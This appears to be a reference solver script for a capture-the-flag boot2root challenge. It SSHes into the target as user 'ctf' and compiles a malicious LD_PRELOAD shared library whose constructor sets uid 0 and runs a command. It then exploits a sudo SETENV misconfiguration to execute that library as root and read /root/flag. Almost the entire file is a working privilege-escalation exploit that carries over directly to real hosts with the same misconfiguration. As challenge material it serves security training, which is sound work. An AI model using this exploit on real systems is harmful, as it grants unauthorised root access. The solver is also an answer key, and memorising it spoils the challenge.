#!/usr/bin/env bash
# Reference solver for boot2root-ssh. Needs `sshpass`.
#   ./solve.sh HOST PORT [password]
# SSH in as ctf, build a preload lib whose constructor runs as root via the
# sudo SETENV + LD_PRELOAD misconfig, and print /root/flag.
set -euo pipefail
HOST="${1:?usage: solve.sh HOST PORT [password]}"
PORT="${2:?port}"
PW="${3:-ctf}"

sshpass -p "$PW" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  -p "$PORT" "ctf@$HOST" 'bash -s' <<"REMOTE"
set -e
cat > /dev/shm/rootme.c <<'CEOF'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void pwn(void){ setuid(0); setgid(0);
  system("cat /root/flag"); }
CEOF
gcc -shared -fPIC -o /dev/shm/rootme.so /dev/shm/rootme.c
echo "[*] triggering sudo SETENV + LD_PRELOAD ..." >&2
sudo LD_PRELOAD=/dev/shm/rootme.so healthcheck
REMOTE
